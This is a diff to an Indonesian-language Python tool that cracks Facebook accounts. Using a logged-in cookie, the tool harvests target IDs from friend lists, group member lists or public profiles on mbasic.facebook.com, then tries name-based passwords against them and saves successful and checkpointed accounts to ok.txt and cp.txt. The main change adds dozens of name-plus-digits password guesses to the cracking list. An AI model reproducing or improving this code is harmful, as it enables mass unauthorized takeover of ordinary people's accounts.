@@ -344,7 +344,7 @@ def mbfv2():
                          aink("\x1b[1;92m ▪▪▪▪▪▪▪▪▪▪ 100%")
                          os.system("rm -rf cookies")
                          print("\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]\x1b[1;93m Menghapus Cokiee Selesai!")
-                         uwutc()
+                         mbfv2()
                    elif doge == '1' or doge =='01':
                          url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                          username = getid(mbasic.format(url["href"]))
@@ -368,7 +368,7 @@ def mbfv2():
                          grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[93mMasukin ID Grup \033[1;91m: \033[1;92m")
                          username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                          if len(username) == 0:
-                                 exit("\033[92m[\033[91m!\033[92m] \033[91mGRUP ID TIDAK DITEMUKAN!")
+                                 exit("\033[90m[\033[91m!\033[90m] \033[97mGRUP ID TIDAK DITEMUKAN!")
                    elif doge == '5' or doge =='05':
                          knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] \033[92mUSERNAME/ID PUBLIK\033[1;91m: \033[1;92m")
                          if knf.isdigit():
@@ -379,7 +379,7 @@ def mbfv2():
                                  user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                  username = getid(mbasic.format(user))
                          except TypeError:
-                                 exit("\033[93m[\033[91m!\033[93m] \033[91mPENGGUNA TIDAK DITEMUKAN!")
+                                 exit("\033[90m[\033[91m!\033[90m] \033[97mPENGGUNA TIDAK DITEMUKAN!")
                    elif doge == '6' or doge =='06':
                          try:
                                  file1 = open("cp.txt").read()
@@ -402,7 +402,7 @@ def mbfv2():
                                  print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Selesai...")
                                  print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Di Save Di \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                          except FileNotFoundError:
-                                 exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
+                                 exit("\n\033[00m[\033[91m!\033[00m] Kamu tidak mendapatkan hasil")
                    else:
                          print("\n\n \033[00m[\033[91m😣\033[00m] Harus dipillih!")
                          uwu()
@@ -426,10 +426,62 @@ def mbfv2():
                                   ss = users[0].split(' ')
                                   for x in ss:
                                           listpass = [
+                                                  str(x) + '1',
+                                                  str(x) + '12',
                                                   str(x) + '123',
                                                   str(x) + '1234',
                                                   str(x) + '12345',
+                                                  str(x) + '123456',
+                                                  str(x) + '1234567',
+                                                  str(x) + '12345678',
+                                                  str(x) + '123456789',
+                                                  str(x) + '10',
+                                                  str(x) + '11',
+                                                  str(x) + '12',
+                                                  str(x) + '13',
+                                                  str(x) + '14',
+                                                  str(x) + '15',
+                                                  str(x) + '16',
+                                                  str(x) + '17',
+                                                  str(x) + '18',
+                                                  str(x) + '19',
+                                                  str(x) + '20',
+                                                  str(x) + '21',
+                                                  str(x) + '22',
+                                                  str(x) + '23',
+                                                  str(x) + '24',
+                                                  str(x) + '25',
+                                                  str(x) + '26',
+                                                  str(x) + '27',
+                                                  str(x) + '28',
+                                                  str(x) + '29',
+                                                  str(x) + '30',
+                                                  str(x) + '100',
+                                                  str(x) + '200',
+                                                  str(x) + '300',
+                                                  str(x) + '400',
+                                                  str(x) + '500',
+                                                  str(x) + '600',
+                                                  str(x) + '700',
+                                                  str(x) + '800',
+                                                  str(x) + '900',
+                                                  str(x) + '1000',
+                                                  str(x) + '0',
+                                                  str(x) + '09',
+                                                  str(x) + '098',
                                                   str(x) + '0987',
+                                                  str(x) + '09876',
+                                                  str(x) + '098765',
+                                                  str(x) + '0987654',
+                                                  str(x) + '09876543',
+                                                  str(x) + '098765432',
+                                                  str(x) + '0987654321',
+                                                  str(x) + '1123',
+                                                  str(x) + '01',
+                                                  str(x) + '02',
+                                                  str(x) + '0908',
+                                                  str(x) + '0987',
+                                                  str(x) + '890',
                                                   ]
                                           listpass.append(expass)
                                           for passw in set(listpass):
@@ -447,13 +499,13 @@ def mbfv2():
 
     elif uwu == "2" or uwu =="02":
          os.system("xdg-open https://youtu.be/QF0jMxC6CkE")
-         exit()
+         mbfv2()
     elif uwu == "3" or uwu =="03":
          os.system('xdg-open https://www.facebook.com/groups/338110617616908')
-         exit()
+         mbfv2()
     elif uwu == "4" or uwu =="04":
          os.system('xdg-open https://chat.whatsapp.com/EEl2Erzh6jkEahbYE3QMu2')
-         exit()
+         mbfv2()
     elif uwu == "5" or uwu =="05":
          print("\n\n\x1b[1;97m      [ \x1b[1;92m[▪] Tunggu sebentar... \x1b[1;97m ]\n")
          print("\033[93m [~] PROSES SEDANG BERJALAN ")
